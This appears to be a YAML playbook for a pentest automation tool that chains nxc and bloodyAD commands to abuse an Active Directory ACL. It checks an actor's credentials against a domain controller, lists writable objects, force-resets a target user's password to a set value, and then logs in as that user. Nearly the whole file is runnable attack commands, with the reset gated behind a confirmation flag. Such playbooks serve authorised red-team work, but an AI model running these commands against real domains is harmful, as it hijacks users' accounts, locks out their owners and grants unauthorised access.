name: ad_acl_forcechangepassword
description: nxc validates actor creds + reachability, bloodyAD force-resets a target user's password (ACL abuse), nxc re-validates as that user
vars:
  TARGET_PASSWORD: "Password123!"
steps:
  - title: Validate actor creds against the DC over SMB (halt if invalid)
    command: nxc smb {{DC_IP:ip}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}}
    continue_on_error: false
  - title: Confirm LDAP reachability and whoami as the actor
    command: nxc ldap {{DC_IP:ip}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} -M whoami
    continue_on_error: false
  - title: Enumerate the actor's writable objects (find the ACL edge over the target)
    command: bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get writable --detail
    continue_on_error: true
  - title: "DESTRUCTIVE force-reset {{TARGET_USER}} password (arm with: q set CONFIRM_RESET 1)"
    command: bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} set password {{TARGET_USER}} '{{TARGET_PASSWORD}}'
    when: "CONFIRM_RESET"
    continue_on_error: false
  - title: Re-validate — authenticate to the DC as the reset target user
    command: nxc smb {{DC_IP:ip}} -d {{DOMAIN}} -u {{TARGET_USER}} -p '{{TARGET_PASSWORD}}'
    when: "CONFIRM_RESET"
    continue_on_error: true
